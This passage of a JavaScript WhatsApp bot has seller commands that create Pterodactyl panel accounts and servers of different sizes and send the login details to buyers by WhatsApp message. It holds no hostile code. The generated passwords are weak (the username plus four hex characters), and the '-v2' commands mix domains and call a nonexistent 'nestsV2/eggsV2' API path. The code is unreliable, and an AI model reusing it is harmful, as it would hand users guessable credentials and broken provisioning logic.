let memo = "5024"
let cpu = "140"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c5gb-v2": {

if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "5024"
let cpu = "140"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c6gb": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "6024"
let cpu = "170"
let disk = "6024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c6gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "6024"
let cpu = "170"
let disk = "6024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c7gb": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "7024"
let cpu = "180"
let disk = "7024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c7gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "7024"
let cpu = "180"
let disk = "7024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c8gb": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "8024"
let cpu = "190"
let disk = "8024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c8gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "8024"
let cpu = "190"
let disk = "8024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c9gb": {
       
    if (!isCreator && !isSeller) return reply(mess.seller)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "9024"
let cpu = "200"
let disk = "9024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,

"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
case "c9gb-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await client.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "9024"
let cpu = "200"
let disk = "9024"
let email = username + "1398@gmail.com"
akunlo = "https://img101.pixhost.to/images/349/551214073_client.jpg" 
if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
client.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: loli })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

